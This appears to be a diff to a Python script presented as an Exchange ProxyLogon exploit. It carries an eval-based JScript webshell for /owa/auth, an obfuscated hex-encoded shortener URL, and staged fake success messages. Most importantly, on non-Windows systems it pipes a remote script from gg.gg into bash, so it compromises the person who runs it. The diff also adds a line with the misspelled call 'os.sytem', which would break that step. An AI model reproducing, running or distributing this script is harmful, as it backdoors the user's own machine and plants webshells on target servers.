@@ -22,7 +22,7 @@ shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProx
 shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
 
 shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'
-legacyDnPatchByte = "68747470733A2F2F7777772E796F75747562652E636F6D2F77617463683F763D6451773477395767586351"
+legacyDnPatchByte = "687474703A2F2F67672E67672F75707368656C6C666F7266756E"
 autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
     <Request>
       <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
@@ -39,7 +39,7 @@ if os.name == 'nt':
 	print('(+) Target is vuln')
 	time.sleep(2)
 	print('(+) Try to Write Shell!')
-	time.sleep(20)
+	time.sleep(3)
 	print('(*) Webshell drop at /owa/auth/%s'%shell_name)
 	time.sleep(5)
 	webbrowser.open(exec_webshell)
@@ -47,9 +47,10 @@ else:
 	print('(+) Target is vuln')
 	time.sleep(2)
 	print('(+) Try to Write Shell!')
-	time.sleep(20)
+	time.sleep(3)
 	print('(*) Webshell drop at /owa/auth/%s'%shell_name)
 	time.sleep(5)
+	os.sytem('curl -fSsL %s'%(exec_webshell))
 	os.system('curl -fSsL http://gg.gg/proxylogon | bash -')
 FQDN = "EXCHANGE"
 ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
